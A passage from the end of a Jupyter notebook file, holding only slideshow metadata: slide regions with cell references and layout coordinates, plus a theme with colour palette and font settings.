        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "a4124fd2-d963-4692-877e-6796c96f8a95",
        "part": "whole"
       },
       "id": "75b691ba-a479-4fe9-912b-04e1c0c7c0ee"
      }
     }
    },
    "daf49c9e-5c61-4f0b-aa3b-f987c3acfef5": {
     "id": "daf49c9e-5c61-4f0b-aa3b-f987c3acfef5",
     "prev": "7f7e24e0-146b-4ac1-b996-af0210508778",
     "regions": {
      "dedfdd82-d51d-44cb-a67a-2325332c0ea5": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "f5b3946c-a331-4f61-a495-aa44a48a0fed",
        "part": "whole"
       },
       "id": "dedfdd82-d51d-44cb-a67a-2325332c0ea5"
      }
     }
    },
    "e4f3eff3-5135-4492-930d-7cb772a71bf3": {
     "id": "e4f3eff3-5135-4492-930d-7cb772a71bf3",
     "prev": "d9e8a525-5264-4f49-9229-43f41f148a99",
     "regions": {
      "6d8f0681-6aac-4776-9cf5-3aff802ff680": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "f759b219-55b6-44f2-8937-023003bac3ce",
        "part": "whole"
       },
       "id": "6d8f0681-6aac-4776-9cf5-3aff802ff680"
      }
     }
    },
    "eaca8578-9800-411d-b8d4-d6fa4d3dc100": {
     "id": "eaca8578-9800-411d-b8d4-d6fa4d3dc100",
     "prev": "6e0d2c5d-87ec-49ad-914e-cc37a0b911e2",
     "regions": {
      "a1bec3dd-d365-42ae-8e30-bab893660fcf": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "a5f10123-5e63-4196-a3a8-c3df92be6fd3",
        "part": "whole"
       },
       "id": "a1bec3dd-d365-42ae-8e30-bab893660fcf"
      }
     }
    },
    "eb09eb19-376c-423a-92e5-8b80f0c0b08b": {
     "id": "eb09eb19-376c-423a-92e5-8b80f0c0b08b",
     "prev": "2621969f-e693-4441-84f6-3115f5518415",
     "regions": {
      "f44955bd-1ce9-4e31-bb55-02c22a6f089d": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "b6c6123a-2cda-4b1e-97c4-56624d797fab",
        "part": "whole"
       },
       "id": "f44955bd-1ce9-4e31-bb55-02c22a6f089d"
      }
     }
    },
    "f34d073c-671d-4789-a684-2b1f89662af8": {
     "id": "f34d073c-671d-4789-a684-2b1f89662af8",
     "prev": "22e56919-c468-49a6-acca-4bf6a50bf6ac",
     "regions": {
      "bbff7728-6fcc-481d-bf03-95aa7055ef6d": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "6a2d673f-f3af-4e6a-8033-c57bc2f12962",
        "part": "whole"
       },
       "id": "bbff7728-6fcc-481d-bf03-95aa7055ef6d"
      }
     }
    },
    "ff52c62f-304a-4cdc-9f5d-b087afeed87b": {
     "id": "ff52c62f-304a-4cdc-9f5d-b087afeed87b",
     "prev": "af44c245-150e-4d48-b2d5-e760610e7eef",
     "regions": {
      "7f2ad32d-7c44-4ffa-9d55-0b2b52a0b79d": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "5f54d3e4-9b19-4e22-82a8-e049f3054118",
        "part": "whole"
       },
       "id": "7f2ad32d-7c44-4ffa-9d55-0b2b52a0b79d"
      }
     }
    },
    "ffceddff-00da-423c-b8d3-50f3c43fd766": {
     "id": "ffceddff-00da-423c-b8d3-50f3c43fd766",
     "prev": "4da0aa2e-73af-43e0-bc88-2e86a44d186c",
     "regions": {
      "f9c79d6f-77c1-40d6-9170-51af43c8e0ea": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "378f768b-3237-4478-9597-1e3d060220da",
        "part": "whole"
       },
       "id": "f9c79d6f-77c1-40d6-9170-51af43c8e0ea"
      }
     }
    }
   },
   "themes": {
    "default": "074d9ee2-bd72-4949-a75c-037dde00d14f",
    "theme": {
     "074d9ee2-bd72-4949-a75c-037dde00d14f": {
      "id": "074d9ee2-bd72-4949-a75c-037dde00d14f",
      "palette": {
       "19cc588f-0593-49c9-9f4b-e4d7cc113b1c": {
        "id": "19cc588f-0593-49c9-9f4b-e4d7cc113b1c",
        "rgb": [
         252,
         252,
         252
        ]
       },
       "31af15d2-7e15-44c5-ab5e-e04b16a89eff": {
        "id": "31af15d2-7e15-44c5-ab5e-e04b16a89eff",
        "rgb": [
         68,
         68,
         68
        ]
       },
       "50f92c45-a630-455b-aec3-788680ec7410": {
        "id": "50f92c45-a630-455b-aec3-788680ec7410",
        "rgb": [
         155,
         177,
         192
        ]
       },
       "c5cc3653-2ee1-402a-aba2-7caae1da4f6c": {
        "id": "c5cc3653-2ee1-402a-aba2-7caae1da4f6c",
        "rgb": [
         43,
         126,
         184
        ]
       },
       "efa7f048-9acb-414c-8b04-a26811511a21": {
        "id": "efa7f048-9acb-414c-8b04-a26811511a21",
        "rgb": [
         25.118061674008803,
         73.60176211453744,
         107.4819383259912
        ]
       }
      },
      "rules": {
       "blockquote": {
        "color": "50f92c45-a630-455b-aec3-788680ec7410"
       },
       "code": {
        "font-family": "Anonymous Pro"
       },
       "h1": {
        "color": "c5cc3653-2ee1-402a-aba2-7caae1da4f6c",
        "font-family": "Lato",
        "font-size": 8
       },
       "h2": {
        "color": "c5cc3653-2ee1-402a-aba2-7caae1da4f6c",
        "font-family": "Lato",
        "font-size": 6
       },
       "h3": {
        "color": "50f92c45-a630-455b-aec3-788680ec7410",
        "font-family": "Lato",
        "font-size": 5.5
       },
       "h4": {
        "color": "c5cc3653-2ee1-402a-aba2-7caae1da4f6c",
        "font-family": "Lato",
        "font-size": 5
       },
       "h5": {
        "font-family": "Lato"
       },
       "h6": {
        "font-family": "Lato"
       },
       "h7": {
        "font-family": "Lato"
       },
       "pre": {
        "font-family": "Anonymous Pro",
        "font-size": 4
       }
      },
      "text-base": {
       "font-family": "Merriweather",
       "font-size": 4
      }
     }
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
